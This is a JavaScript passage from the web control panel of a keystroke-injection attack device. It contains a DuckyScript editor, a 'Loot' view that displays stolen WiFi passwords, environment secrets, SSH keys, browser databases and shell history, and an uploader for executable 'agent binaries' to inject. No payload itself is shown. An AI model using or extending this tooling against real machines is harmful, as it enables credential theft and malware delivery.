const notice = document.getElementById('notice');
const payloadField = document.getElementById('payload');
const saveButton = document.getElementById('save');
const runButton = document.getElementById('run');
const refreshButton = document.getElementById('refresh');
const keyboardOsSelect = document.getElementById('keyboard-os');
const keyboardLayoutSelect = document.getElementById('keyboard-layout');
const runHistory = document.getElementById('run-history');
const editorGutter = document.getElementById('editor-gutter');
const editorHighlight = document.getElementById('editor-highlight');
const editorMarkers = document.getElementById('editor-markers');
const infoIcon = document.getElementById('info-icon');
const validationModal = document.getElementById('validation-modal');
const modalBackdrop = document.getElementById('modal-backdrop');
const modalBody = document.getElementById('modal-body');
const modalSubtitle = document.getElementById('modal-subtitle');
const modalClose = document.getElementById('modal-close');
const validationBadge = document.querySelector(
  '[data-bind="validation_badge"]',
);
const uiState = {
  charWidth: 8,
  lineHeight: 22,
  padLeft: 16,
  padTop: 14,
  changingTarget: false,
  keyboardOses: [],
  keyboardLayouts: [],
  running: false,
  saving: false,
  validating: false,
  validation: null,
  validationRequest: 0,
  validationTimer: 0,
  lastValidatedPayload: null,
};

const HL_FLOW = new Set([
  'IF',
  'ELSE',
  'ELSEIF',
  'END_IF',
  'WHILE',
  'END_WHILE',
  'FUNCTION',
  'END_FUNCTION',
  'RETURN',
  'CALL',
  'REPEAT',
  'VAR',
  'DEFINE',
  'BUTTON_DEF',
  'END_BUTTON',
  'EXTENSION',
  'END_EXTENSION',
]);
const HL_STRING_CMD = new Set([
  'STRING',
  'STRINGLN',
  'END_STRING',
  'END_STRINGLN',
]);
const HL_KEYWORD = new Set([
  'ATTACKMODE',
  'ATTACKMODE',
  'DELAY',
  'DEFAULTDELAY',
  'DEFAULT_DELAY',
  'DEFAULTCHARDELAY',
  'DEFAULT_CHAR_DELAY',
  'DEFAULTCHARJITTER',
  'DISABLE_BUTTON',
  'ENABLE_BUTTON',
  'EXFIL',
  'HIDE_PAYLOAD',
  'EXFIL',
  'HIDE_PAYLOAD',
  'INJECT_MOD',
  'INJECT_VAR',
  'RD_KBD',
  'RELEASE',
  'RESET',
  'RESTORE_ATTACKMODE',
  'RESTORE_HOST_KEYBOARD_LOCK_STATE',
  'RESTORE_PAYLOAD',
  'RESTORE_ATTACKMODE',
  'RESTORE_HOST_KEYBOARD_LOCK_STATE',
  'RESTORE_PAYLOAD',
  'RESTART_PAYLOAD',
  'SAVE_ATTACKMODE',
  'SAVE_HOST_KEYBOARD_LOCK_STATE',
  'STOP_PAYLOAD',
  'SAVE_ATTACKMODE',
  'SAVE_HOST_KEYBOARD_LOCK_STATE',
  'STOP_PAYLOAD',
  'VERSION',
  'WAIT_FOR_BUTTON_PRESS',
  'WAIT_FOR_CAPS_CHANGE',
  'WAIT_FOR_CAPS_OFF',
  'WAIT_FOR_CAPS_ON',
  'WAIT_FOR_NUM_CHANGE',
  'WAIT_FOR_NUM_OFF',
  'WAIT_FOR_NUM_ON',
  'WAIT_FOR_SCROLL_CHANGE',
  'WAIT_FOR_SCROLL_OFF',
  'WAIT_FOR_SCROLL_ON',
  'WAIT_FOR_CAPS_CHANGE',
  'WAIT_FOR_CAPS_OFF',
  'WAIT_FOR_CAPS_ON',
  'WAIT_FOR_NUM_CHANGE',
  'WAIT_FOR_NUM_OFF',
  'WAIT_FOR_NUM_ON',
  'WAIT_FOR_SCROLL_CHANGE',
  'WAIT_FOR_SCROLL_OFF',
  'WAIT_FOR_SCROLL_ON',
  'RANDOM_CHAR',
  'RANDOM_CHAR_FROM',
  'RANDOM_LOWERCASE_LETTER',
  'RANDOM_UPPERCASE_LETTER',
  'RANDOM_LETTER',
  'RANDOM_NUMBER',
  'RANDOM_SPECIAL',
  'HOLD',
  'LED_R',
  'LED_G',
  'LED_B',
  'LED_ON',
  'LED_OFF',
]);

function escHtml(s) {
  return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

function hlVars(escaped) {
  return escaped.replace(
    /\$([A-Za-z_]\w*)/g,
    '<span class="hl-var">$$$1</span>',
  );
}

function highlightLine(raw) {
  if (!raw.trim()) return escHtml(raw);
  const indent = raw.length - raw.trimStart().length;
  const stripped = raw.slice(indent);
  const upper = stripped.toUpperCase();
  if (upper === 'REM' || upper.startsWith('REM ')) {
    return `<span class="hl-comment">${escHtml(raw)}</span>`;
  }
  const spaceAt = stripped.search(/\s/);
  const token = spaceAt < 0 ? stripped : stripped.slice(0, spaceAt);
  const rest = spaceAt < 0 ? '' : stripped.slice(spaceAt);
  const tu = token.toUpperCase();
  let cls = null;
  if (HL_FLOW.has(tu)) cls = 'hl-flow';
  if (HL_FLOW.has(tu)) cls = 'hl-flow';
  else if (HL_STRING_CMD.has(tu) || HL_KEYWORD.has(tu)) cls = 'hl-keyword';
  if (!cls) return escHtml(raw);
  const indentHtml = escHtml(raw.slice(0, indent));
  const tokenHtml = `<span class="${cls}">${escHtml(token)}</span>`;
  const restHtml =
    HL_STRING_CMD.has(tu) && rest
      ? `<span class="hl-string">${hlVars(escHtml(rest))}</span>`
      : hlVars(escHtml(rest));
  return indentHtml + tokenHtml + restHtml;
}

function renderHighlight() {
  if (!payloadField || !editorHighlight) return;
  editorHighlight.innerHTML = payloadField.value
    .split('\n')
    .map(highlightLine)
    .join('\n');
  syncEditorDecorations();
}

let _noticeTimer = 0;

function setNotice(message, tone = 'quiet') {
  if (!notice) {
    return;
  }
  clearTimeout(_noticeTimer);
  if (!message) {
    notice.className = 'notice notice--hidden';
    notice.textContent = '';
    return;
  }
  notice.className = `notice notice--${tone}`;
  notice.textContent = message;
  _noticeTimer = setTimeout(() => {
    notice.className = 'notice notice--hidden';
    notice.textContent = '';
  }, 2000);
}

function setBoundText(name, value) {
  document.querySelectorAll(`[data-bind="${name}"]`).forEach((node) => {
    if ('password' in node.dataset) {
      const toggle = document.getElementById('ap-password-toggle');
      const isOpen = value === 'Open network';
      node.dataset.plain = value;
      node.textContent = isOpen ? value : '•'.repeat(value.length);
      if (toggle) {
        toggle.hidden = isOpen;
        toggle.setAttribute('aria-pressed', 'false');
        toggle.setAttribute('aria-label', 'Show AP password');
      }
    } else {
      node.textContent = value;
    }
  });
}

function setBadge(node, label, tone) {
  if (!node) {
    return;
  }
  node.className = tone ? `badge badge--${tone}` : 'badge';
  node.textContent = label;
}

function updateControls() {
  const validation = uiState.validation;
  if (saveButton) {
    saveButton.disabled =
      uiState.validating ||
      uiState.saving ||
      !validation ||
      !validation.can_save;
  }
  if (runButton) {
    runButton.disabled =
      uiState.validating ||
      uiState.running ||
      !validation ||
      !validation.can_run;
  }
  if (keyboardOsSelect) keyboardOsSelect.disabled = uiState.changingTarget;
  if (keyboardLayoutSelect)
    keyboardLayoutSelect.disabled = uiState.changingTarget;
}

function itemTitle(item) {
  return [item.message, item.hint].filter(Boolean).join('\n');
}

function renderRunHistory(entries = []) {
  if (!runHistory) {
    return;
  }

  runHistory.textContent = '';
  if (!entries.length) {
    const empty = document.createElement('p');
    empty.className = 'history__empty';
    empty.textContent = 'No payloads have run yet.';
    runHistory.appendChild(empty);
    return;
  }

  entries.forEach((entry) => {
    const item = document.createElement('article');
    item.className = 'history__item';

    const isOk = entry.notice === 'success';
    const sourceLabel = entry.source === 'boot' ? 'Boot' : 'Portal';
    const summary =
      (entry.message || '').split('\n')[0].trim() ||
      entry.preview ||
      'Empty payload';

    const tag = document.createElement('span');
    tag.className = 'history__seq';
    tag.textContent = `#${entry.sequence}`;

    const text = document.createElement('span');
    text.className = 'history__text';
    text.textContent = `${sourceLabel} · ${summary}`;

    const badge = document.createElement('span');
    badge.className = `history__badge ${isOk ? 'history__badge--ok' : 'history__badge--err'}`;
    badge.textContent = isOk ? 'OK' : 'Err';

    item.title =
      `${sourceLabel} run #${entry.sequence}\n${entry.message || ''}`.trim();

    item.appendChild(tag);
    item.appendChild(text);
    item.appendChild(badge);
    runHistory.appendChild(item);
  });
}

async function requestJson(path, options = {}) {
  const response = await fetch(path, {
    credentials: 'same-origin',
    headers: {
      'Content-Type': 'application/json',
      ...options.headers,
    },
    ...options,
  });

  const data = await response.json().catch(() => ({}));
  if (!response.ok) {
    const error = new Error(
      data.message || `Request failed with ${response.status}`,
    );
    error.data = data;
    error.status = response.status;
    throw error;
  }
  return data;
}

function renderKeyboardLayouts(state) {
  uiState.keyboardOses = state.keyboard_oses || uiState.keyboardOses || [];
  uiState.keyboardLayouts =
    state.keyboard_layouts || uiState.keyboardLayouts || [];
  setBoundText(
    'keyboard_layout_label',
    state.keyboard_layout_label || 'English (US)',
  );
  setBoundText(
    'keyboard_target_label',
    state.keyboard_target_label || 'Windows · English (US)',
  );
  setBoundText(
    'keyboard_layout_hint',
    state.keyboard_layout_hint ||
      'Used for typed text and remembered on the device.',
  );

  if (keyboardOsSelect) {
    const osSelected = state.keyboard_os_code || state.keyboard_os || 'WIN';
    const osOptions = uiState.keyboardOses.map((item) => {
      const option = document.createElement('option');
      option.value = item.code;
      option.textContent = item.label;
      return option;
    });
    keyboardOsSelect.replaceChildren(...osOptions);
    keyboardOsSelect.value = osSelected;
  }

  if (!keyboardLayoutSelect) {
    return;
  }

  const selected = state.keyboard_layout_code || state.keyboard_layout || 'US';
  const options = uiState.keyboardLayouts.map((item) => {
    const option = document.createElement('option');
    option.value = item.code;
    option.textContent = item.label;
    return option;
  });

  keyboardLayoutSelect.replaceChildren(...options);
  keyboardLayoutSelect.value = selected;
}

function measureEditor() {
  if (!payloadField) {
    return;
  }
  const styles = window.getComputedStyle(payloadField);
  const probe = document.createElement('span');
  probe.textContent = 'M';
  probe.style.position = 'absolute';
  probe.style.visibility = 'hidden';
  probe.style.whiteSpace = 'pre';
  probe.style.fontFamily = styles.fontFamily;
  probe.style.fontSize = styles.fontSize;
  probe.style.lineHeight = styles.lineHeight;
  payloadField.parentElement?.appendChild(probe);
  uiState.charWidth = probe.getBoundingClientRect().width || 8;
  probe.remove();
  uiState.lineHeight =
    parseFloat(styles.lineHeight) || parseFloat(styles.fontSize || '13') * 1.7;
  uiState.padTop = parseFloat(styles.paddingTop) || 14;
  uiState.padLeft = parseFloat(styles.paddingLeft) || 16;
}

function diagnosticLineMap(diagnostics = []) {
  const lines = new Map();
  diagnostics.forEach((diagnostic) => {
    const current = lines.get(diagnostic.line) || {
      severity: diagnostic.severity,
      titles: [],
    };
    if (diagnostic.severity === 'error') {
      current.severity = 'error';
    } else if (current.severity !== 'error') {
      current.severity = 'warning';
    }
    current.titles.push(itemTitle(diagnostic));
    lines.set(diagnostic.line, current);
  });
  return lines;
}

function syncEditorDecorations() {
  if (!payloadField) {
    return;
  }
  const gutterLines = editorGutter?.querySelector('.editor__gutter-lines');
  if (gutterLines) {
    gutterLines.style.transform = `translateY(${-payloadField.scrollTop}px)`;
  }
  if (editorHighlight) {
    editorHighlight.style.transform = `translate(${-payloadField.scrollLeft}px, ${-payloadField.scrollTop}px)`;
  }
  if (editorMarkers) {
    editorMarkers.style.transform = `translate(${-payloadField.scrollLeft}px, ${-payloadField.scrollTop}px)`;
  }
}

function renderEditorDecorations(validation) {
  if (!payloadField || !editorGutter || !editorMarkers) {
    return;
  }

  const diagnostics = validation?.diagnostics || [];
  const lineMap = diagnosticLineMap(diagnostics);
  const text = payloadField.value;
  const lines = text === '' ? [''] : text.split('\n');

  const gutterLines = document.createElement('div');
  gutterLines.className = 'editor__gutter-lines';

  lines.forEach((_line, index) => {
    const lineNo = index + 1;
    const row = document.createElement('div');
    const lineState = lineMap.get(lineNo);
    row.className = `editor__gutter-line${
      lineState ? ` editor__gutter-line--${lineState.severity}` : ''
    }`;
    row.title = lineState ? lineState.titles.join('\n\n') : '';

    if (lineState) {
      const dot = document.createElement('span');
      dot.className = 'editor__gutter-dot';
      row.appendChild(dot);
    }

    const label = document.createElement('span');
    label.textContent = String(lineNo);
    row.appendChild(label);
    gutterLines.appendChild(row);
  });

  editorGutter.replaceChildren(gutterLines);

  const markerNodes = diagnostics.map((diagnostic) => {
    const marker = document.createElement('div');
    marker.className = `editor__marker editor__marker--${diagnostic.severity}`;
    marker.style.top = `${
      uiState.padTop +
      (diagnostic.line - 1) * uiState.lineHeight +
      uiState.lineHeight -
      4
    }px`;
    marker.style.left = `${uiState.padLeft + (diagnostic.column - 1) * uiState.charWidth}px`;
    marker.style.width = `${
      Math.max(diagnostic.end_column - diagnostic.column, 1) * uiState.charWidth
    }px`;
    return marker;
  });
  editorMarkers.replaceChildren(...markerNodes);
  syncEditorDecorations();
}

function renderModalDiagnostics(diagnostics = []) {
  if (!modalBody) {
    return;
  }
  if (!diagnostics.length) {
    const empty = document.createElement('p');
    empty.className = 'modal__empty';
    empty.textContent = 'No issues detected.';
    modalBody.replaceChildren(empty);
    return;
  }

  const items = diagnostics.map((diagnostic) => {
    const item = document.createElement('article');
    item.className = `modal__item modal__item--${diagnostic.severity}`;
    item.title = [diagnostic.message, diagnostic.hint]
      .filter(Boolean)
      .join('\n\n');

    const line = document.createElement('p');
    line.className = 'modal__item-line';
    line.textContent = `Line ${diagnostic.line} · col ${diagnostic.column}`;

    const message = document.createElement('p');
    message.className = 'modal__item-message';
    message.textContent = diagnostic.message;

    item.appendChild(line);
    item.appendChild(message);

    if (diagnostic.hint) {
      const hint = document.createElement('p');
      hint.className = 'modal__item-hint';
      hint.textContent = diagnostic.hint;
      item.appendChild(hint);
    }

    return item;
  });
  modalBody.replaceChildren(...items);
}

function renderPendingValidation() {
  setBadge(validationBadge, 'Checking…', 'accent');
  setBoundText('validation_summary', 'Checking payload…');
  if (infoIcon) {
    infoIcon.style.display = 'none';
  }
  closeModal();
  renderEditorDecorations({ diagnostics: [] });
  updateControls();
}

function renderValidation(validation) {
  uiState.validation = validation;
  setBadge(
    validationBadge,
    validation.badge_label || 'Ready',
    validation.badge_tone || 'success',
  );
  setBoundText('validation_summary', validation.summary || 'Dry run complete.');

  const diagnostics = validation.diagnostics || [];
  renderModalDiagnostics(diagnostics);

  const errorCount = diagnostics.filter((d) => d.severity === 'error').length;
  const warningCount = diagnostics.filter(
    (d) => d.severity === 'warning',
  ).length;

  if (infoIcon) {
    const hasIssues = diagnostics.length > 0;
    infoIcon.style.display = hasIssues ? 'inline-flex' : 'none';
    if (hasIssues) {
      const labelParts = [];
      if (errorCount)
        labelParts.push(`${errorCount} error${errorCount > 1 ? 's' : ''}`);
      if (warningCount)
        labelParts.push(
          `${warningCount} warning${warningCount > 1 ? 's' : ''}`,
        );
      setBoundText('info_count', labelParts.join(', '));
    }
    if (!hasIssues) {
      closeModal();
    }
  }

  if (modalSubtitle) {
    if (errorCount && warningCount) {
      modalSubtitle.textContent = `${errorCount} error${errorCount > 1 ? 's' : ''}, ${warningCount} warning${warningCount > 1 ? 's' : ''}`;
    } else if (errorCount) {
      modalSubtitle.textContent = `${errorCount} error${errorCount > 1 ? 's' : ''} found in the payload`;
    } else if (warningCount) {
      modalSubtitle.textContent = `${warningCount} warning${warningCount > 1 ? 's' : ''} found in the payload`;
    } else {
      modalSubtitle.textContent = 'No issues detected';
    }
  }

  renderEditorDecorations(validation);
  updateControls();
}

function queueValidation() {
  if (!payloadField) {
    return;
  }
  window.clearTimeout(uiState.validationTimer);
  uiState.validating = true;
  uiState.validation = null;
  renderPendingValidation();
  uiState.validationTimer = window.setTimeout(() => {
    validatePayloadDraft();
  }, 800);
}

async function validatePayloadDraft() {
  if (!payloadField) {
    return;
  }
  const currentPayload = payloadField.value;
  if (currentPayload === uiState.lastValidatedPayload && uiState.validation) {
    uiState.validating = false;
    renderValidation(uiState.validation);
    return;
  }
  const requestId = ++uiState.validationRequest;

  try {
    const result = await requestJson('/api/validate', {
      method: 'POST',
      body: JSON.stringify({ payload: currentPayload }),
    });
    if (requestId !== uiState.validationRequest) {
      return;
    }
    uiState.lastValidatedPayload = currentPayload;
    uiState.validating = false;
    renderValidation(result.validation);
  } catch (error) {
    if (requestId !== uiState.validationRequest) {
      return;
    }
    uiState.validating = false;
    setNotice(error.message, 'error');
    renderPendingValidation();
  }
}

async function loadBootstrap() {
  const state = await requestJson('/api/bootstrap');
  payloadField.value = state.payload || '';
  measureEditor();
  renderHighlight();
  renderEditorDecorations({ diagnostics: [] });
  await loadLootSnapshot();
  setBoundText('ap_ssid', state.ap_ssid);
  setBoundText('ap_password', state.ap_password || 'Open network');
  renderKeyboardLayouts(state);
  renderRunHistory(state.run_history || []);
  setBoundText('seeded', state.seeded ? 'Yes' : 'No');
  setBoundText('hid_state', state.keyboard_ready ? 'Ready' : 'Waiting');
  setBoundText('auth_label', state.auth_enabled ? 'Enabled' : 'Disabled');
  setBoundText(
    'payload_state',
    state.seeded ? 'Seeded on boot' : 'Saved on device',
  );
  if (state.validation) {
    uiState.validating = false;
    renderValidation(state.validation);
  } else {
    renderPendingValidation();
    queueValidation();
  }
  setNotice(state.message || '', state.notice || 'quiet');
  if (state.has_binary) setArmoryBinaryReady(_TMP_BINARY_NAME);
  startLootStream();
}

async function changeKeyboardTarget(payload) {
  const previousOs = keyboardOsSelect?.value || 'WIN';
  const previousLayout = keyboardLayoutSelect?.value || 'US';
  uiState.changingTarget = true;
  updateControls();
  try {
    const result = await requestJson('/api/keyboard-layout', {
      method: 'POST',
      body: JSON.stringify(payload),
    });
    renderKeyboardLayouts(result);
    setNotice(result.message, result.notice || 'success');
  } catch (error) {
    if (keyboardOsSelect) {
      keyboardOsSelect.value = previousOs;
    }
    if (keyboardLayoutSelect) {
      keyboardLayoutSelect.value = previousLayout;
    }
    if (error.data) {
      renderKeyboardLayouts(error.data);
    }
    setNotice(error.message, 'error');
  } finally {
    uiState.changingTarget = false;
    updateControls();
  }
}

async function savePayload() {
  uiState.saving = true;
  updateControls();
  try {
    const result = await requestJson('/api/payload', {
      method: 'POST',
      body: JSON.stringify({ payload: payloadField.value }),
    });
    if (result.validation) {
      renderValidation(result.validation);
    }
    setBoundText('payload_state', 'Saved on device');
    setNotice(result.message, result.notice || 'success');
  } catch (error) {
    if (error.data?.validation) {
      renderValidation(error.data.validation);
    }
    setNotice(error.message, 'error');
  } finally {
    uiState.saving = false;
    updateControls();
  }
}

async function runPayload() {
  uiState.running = true;
  updateControls();
  try {
    const result = await requestJson('/api/run', {
      method: 'POST',
      body: JSON.stringify({ payload: payloadField.value, save: true }),
    });
    setBoundText('hid_state', 'Ready');
    setBoundText('payload_state', 'Saved on device');
    renderRunHistory(result.run_history || []);
    if (result.validation) {
      renderValidation(result.validation);
    }
    setNotice(result.message, result.notice || 'success');
  } catch (error) {
    if (error.data?.validation) {
      renderValidation(error.data.validation);
    }
    setNotice(error.message, 'error');
  } finally {
    uiState.running = false;
    updateControls();
  }
}

function handlePayloadInput() {
  setBoundText('payload_state', 'Unsaved draft');
  renderHighlight();
  queueValidation();
}

function openModal() {
  if (validationModal) {
    validationModal.classList.add('visible');
    validationModal.setAttribute('aria-hidden', 'false');
    document.body.style.overflow = 'hidden';
  }
}

function closeModal() {
  if (validationModal) {
    validationModal.classList.remove('visible');
    validationModal.setAttribute('aria-hidden', 'true');
    document.body.style.overflow = '';
  }
}

function toggleModal() {
  if (!validationModal) return;
  if (validationModal.classList.contains('visible')) {
    closeModal();
  } else {
    openModal();
  }
}

if (refreshButton) {
  refreshButton.addEventListener('click', () => {
    loadBootstrap().catch((error) => setNotice(error.message, 'error'));
  });
}

if (saveButton) {
  saveButton.addEventListener('click', () => {
    savePayload();
  });
}

if (runButton) {
  runButton.addEventListener('click', () => {
    runPayload();
  });
}

if (keyboardOsSelect) {
  keyboardOsSelect.addEventListener('change', () => {
    changeKeyboardTarget({ os: keyboardOsSelect.value });
  });
}

if (keyboardLayoutSelect) {
  keyboardLayoutSelect.addEventListener('change', () => {
    changeKeyboardTarget({
      os: keyboardOsSelect?.value || 'WIN',
      layout: keyboardLayoutSelect.value,
    });
  });
}

if (infoIcon) {
  infoIcon.addEventListener('click', toggleModal);
}

if (modalClose) {
  modalClose.addEventListener('click', closeModal);
}

if (modalBackdrop) {
  modalBackdrop.addEventListener('click', closeModal);
}

document.addEventListener('keydown', (e) => {
  if (e.key === 'Escape' && validationModal?.classList.contains('visible')) {
    closeModal();
  }
});

if (payloadField) {
  payloadField.addEventListener('input', handlePayloadInput);
  payloadField.addEventListener('scroll', syncEditorDecorations);
}

window.addEventListener('resize', () => {
  measureEditor();
  if (uiState.validation) {
    renderEditorDecorations(uiState.validation);
  } else {
    renderPendingValidation();
  }
});

const apPasswordToggle = document.getElementById('ap-password-toggle');
const apPasswordValue = document.getElementById('ap-password-value');

if (apPasswordToggle && apPasswordValue) {
  apPasswordToggle.addEventListener('click', () => {
    const showing = apPasswordToggle.getAttribute('aria-pressed') === 'true';
    const plain = apPasswordValue.dataset.plain || '';
    apPasswordValue.textContent = showing ? '•'.repeat(plain.length) : plain;
    apPasswordToggle.setAttribute('aria-pressed', String(!showing));
    apPasswordToggle.setAttribute(
      'aria-label',
      showing ? 'Show AP password' : 'Hide AP password',
    );
  });
}

loadBootstrap().catch((error) => setNotice(error.message, 'error'));

// ─── Loot ─────────────────────────────────────────────────────────────────

async function loadLootSnapshot() {
  try {
    const r = await fetch('/api/loot');
    if (r.status === 404) {
      renderLootEmpty();
      return;
    }
    if (!r.ok) return;
    const data = await r.json();
    renderLoot(data);
  } catch (_) {}
}

function renderLootEmpty() {
  const el = document.getElementById('loot-body');
  if (el) {
    el.textContent = '';
    const p = document.createElement('p');
    p.className = 'history__empty';
    p.textContent = 'No loot collected yet.';
    el.appendChild(p);
  }
  const actions = document.getElementById('loot-actions');
  if (actions) actions.hidden = true;
}

function renderLoot(data) {
  const el = document.getElementById('loot-body');
  if (!el) return;

  const type = data.type || 'recon';
  const s = data.system || {};
  const u = data.user || {};
  const osLabel = [s.os_name, s.os_version].filter(Boolean).join(' ');

  let html = '';

  // ── System + user header (shown for recon and any payload that has it) ──
  if (s.hostname || u.username) {
    const rows = [
      s.hostname ? ['Host', escHtml(s.hostname)] : null,
      osLabel ? ['OS', escHtml(osLabel)] : null,
      s.arch ? ['Arch', escHtml(s.arch)] : null,
      u.username
        ? [
            'User',
            escHtml(u.username) +
              (u.is_elevated
                ? ' <span class="badge badge--warn" style="margin-left:4px">admin</span>'
                : ''),
          ]
        : null,
      data.processes?.length
        ? ['Processes', String(data.processes.length)]
        : null,
      data.interfaces?.length
        ? ['Interfaces', String(data.interfaces.length)]
        : null,
      data.software?.length ? ['Software', String(data.software.length)] : null,
    ].filter(Boolean);
    html +=
      '<dl class="meta">' +
      rows
        .map(
          ([label, value]) =>
            `<div class="meta__row"><span class="meta__label">${label}</span>` +
            `<span class="meta__value">${value}</span></div>`,
        )
        .join('') +
      '</dl>';
  }

  // ── WiFi profiles (with passwords if present) ──
  const wifi = data.wifi || [];
  if (wifi.length) {
    html += '<p class="meta__section-label">WiFi Profiles</p><dl class="meta">';
    wifi.forEach((w) => {
      html +=
        `<div class="meta__row"><span class="meta__label">${escHtml(w.ssid || '?')}</span>` +
        `<span class="meta__value meta__value--mono">${escHtml(w.password || '–')}</span></div>`;
    });
    html += '</dl>';
  }

  // ── Exfil-type fields ──
  const secrets = data.env_secrets || [];
  if (secrets.length) {
    html += `<p class="meta__section-label">Env Secrets (${secrets.length})</p><dl class="meta">`;
    secrets.slice(0, 8).forEach((kv) => {
      html +=
        `<div class="meta__row"><span class="meta__label">${escHtml(kv.key || '')}</span>` +
        `<span class="meta__value meta__value--mono">${escHtml(String(kv.value || ''))}</span></div>`;
    });
    if (secrets.length > 8)
      html += `<div class="meta__row"><span class="meta__label" style="opacity:.5">+${secrets.length - 8} more</span></div>`;
    html += '</dl>';
  }

  const sshKeys = data.ssh_keys || [];
  if (sshKeys.length) {
    html += `<p class="meta__section-label">SSH Keys (${sshKeys.length})</p><dl class="meta">`;
    sshKeys.forEach((k) => {
      html +=
        `<div class="meta__row"><span class="meta__label">${escHtml(k.file || '')}</span>` +
        `<span class="meta__value">${k.content ? 'Present' : 'Empty'}</span></div>`;
    });
    html += '</dl>';
  }

  const browserPaths = data.browser_paths || [];
  if (browserPaths.length) {
    html += `<p class="meta__section-label">Browser DBs (${browserPaths.length})</p><dl class="meta">`;
    browserPaths.forEach((p) => {
      const short = String(p).split(/[/\\]/).slice(-2).join('/');
      html += `<div class="meta__row"><span class="meta__label" style="font-size:.75rem">${escHtml(short)}</span></div>`;
    });
    html += '</dl>';
  }

  if (data.shell_history?.length) {
    html += `<p class="meta__section-label">Shell History (${data.shell_history.length} lines)</p>`;
  }

  if (!html) {
    html =
      '<p class="history__empty">Loot received — no recognisable fields.</p>';
  }

  el.innerHTML = html;

  const actions = document.getElementById('loot-actions');
  if (actions) {
    actions.hidden = false;
    const btn = document.getElementById('loot-download');
    if (btn) {
      btn.onclick = () => {
        window.location.href = '/api/loot/download';
      };
    }
  }
}

// ─── Loot live updates (SSE) ─────────────────────────────────────────────

let _lootStream = null;

function applyLootUpdate(data) {
  if (!data || typeof data !== 'object') {
    renderLootEmpty();
    return;
  }
  renderLoot(data);
}

function startLootStream() {
  if (_lootStream || !window.EventSource) return;

  const stream = new EventSource('/api/loot/stream');
  _lootStream = stream;

  stream.addEventListener('loot', (event) => {
    try {
      applyLootUpdate(JSON.parse(event.data));
    } catch (_) {}
  });

  stream.addEventListener('empty', () => {
    renderLootEmpty();
  });

  stream.onerror = async () => {
    // EventSource reconnects automatically. Refresh a snapshot in case the
    // stream is still settling so the loot panel never looks stale.
    try {
      await loadLootSnapshot();
    } catch (_) {}
  };
}

// ─── Accordion ────────────────────────────────────────────────────────────

const _TMP_BINARY_NAME = 'payload.bin';
const _ALLOWED_BINARY_EXTENSIONS = new Set(['appimage', 'bin', 'elf', 'exe']);
const _BLOCKED_FILE_TYPES = new Set([
  'application/gzip',
  'application/json',
  'application/pdf',
  'application/zip',
  'application/x-7z-compressed',
  'application/x-gzip',
  'application/x-tar',
  'application/x-zip-compressed',
]);
const _BINARY_MAGIC_PREFIXES = [
  [0x4d, 0x5a],
  [0x7f, 0x45, 0x4c, 0x46],
  [0xfe, 0xed, 0xfa, 0xce],
  [0xce, 0xfa, 0xed, 0xfe],
  [0xfe, 0xed, 0xfa, 0xcf],
  [0xcf, 0xfa, 0xed, 0xfe],
  [0xca, 0xfe, 0xba, 0xbe],
  [0xbe, 0xba, 0xfe, 0xca],
  [0xca, 0xfe, 0xba, 0xbf],
  [0xbf, 0xba, 0xfe, 0xca],
];

function toggleAccordion(id) {
  const duckySection = document.getElementById('accordion-ducky');
  const armorySection = document.getElementById('accordion-armory');
  const duckyBtn = document.getElementById('accordion-ducky-btn');
  const armoryBtn = document.getElementById('accordion-armory-btn');
  if (!duckySection || !armorySection) return;

  const openDucky = id === 'ducky';
  duckySection.classList.toggle('accordion__section--open', openDucky);
  armorySection.classList.toggle('accordion__section--open', !openDucky);
  duckyBtn?.setAttribute('aria-expanded', String(openDucky));
  armoryBtn?.setAttribute('aria-expanded', String(!openDucky));

  if (openDucky) {
    measureEditor();
    renderHighlight();
  }
}

document
  .getElementById('accordion-ducky-btn')
  ?.addEventListener('click', () => {
    if (
      !document
        .getElementById('accordion-ducky')
        ?.classList.contains('accordion__section--open')
    ) {
      toggleAccordion('ducky');
    }
  });

document
  .getElementById('accordion-armory-btn')
  ?.addEventListener('click', () => {
    if (
      !document
        .getElementById('accordion-armory')
        ?.classList.contains('accordion__section--open')
    ) {
      toggleAccordion('armory');
    }
  });

// ─── Binary Armory ────────────────────────────────────────────────────────

let _selectedFile = null;

const _uploadZone = document.getElementById('upload-zone');
const _binaryFileInput = document.getElementById('binary-file-input');

function _formatBytes(bytes) {
  if (bytes < 1024) return `${bytes} B`;
  if (bytes < 1024 * 1024) return `${(bytes / 1024).toFixed(1)} KB`;
  return `${(bytes / (1024 * 1024)).toFixed(1)} MB`;
}

function _fileExtension(name) {
  const trimmed = (name || '').trim();
  const dot = trimmed.lastIndexOf('.');
  if (dot <= 0 || dot === trimmed.length - 1) {
    return '';
  }
  return trimmed.slice(dot + 1).toLowerCase();
}

function _looksLikeExecutableBinary(bytes) {
  return _BINARY_MAGIC_PREFIXES.some((signature) =>
    signature.every((value, index) => bytes[index] === value),
  );
}

async function _validateArmoryFile(file) {
  if (!file || !file.size) {
    return 'Choose a compiled EXE, ELF, or Mach-O binary.';
  }

  const extension = _fileExtension(file.name);
  if (extension && !_ALLOWED_BINARY_EXTENSIONS.has(extension)) {
    return 'Upload a compiled EXE, ELF, or Mach-O binary.';
  }

  if (
    file.type.startsWith('image/') ||
    file.type.startsWith('text/') ||
    _BLOCKED_FILE_TYPES.has(file.type)
  ) {
    return 'Images, text files, and archives are not valid agent binaries.';
  }

  try {
    const header = new Uint8Array(await file.slice(0, 8).arrayBuffer());
    if (!_looksLikeExecutableBinary(header)) {
      return 'Only executable EXE, ELF, or Mach-O binaries can be uploaded.';
    }
  } catch (_) {
    return 'Unable to inspect the selected file.';
  }

  return '';
}

function _renderSelectedFile(file) {
  const prompt = document.getElementById('upload-zone-prompt');
  const display = document.getElementById('upload-file-display');
  const nameEl = document.getElementById('upload-filename');
  const sizeEl = document.getElementById('upload-filesize');
  if (prompt) prompt.hidden = true;
  if (display) display.hidden = false;
  if (nameEl) nameEl.textContent = file.name;
  if (sizeEl) sizeEl.textContent = _formatBytes(file.size);
}

async function _setSelectedFile(file) {
  const validationError = await _validateArmoryFile(file);
  if (validationError) {
    _selectedFile = null;
    if (_binaryFileInput) {
      _binaryFileInput.value = '';
    }
    _setArmoryNotice(validationError, 'error');
    return;
  }

  _selectedFile = file;
  _renderSelectedFile(file);
  _setArmoryNotice('', 'quiet');
  const uploadBtn = document.getElementById('upload-binary-btn');
  if (uploadBtn) uploadBtn.disabled = false;
  document.getElementById('inject-binary-btn')?.setAttribute('disabled', '');
  _updateArmorySnippet();
}

if (_uploadZone) {
  _uploadZone.addEventListener('click', (e) => {
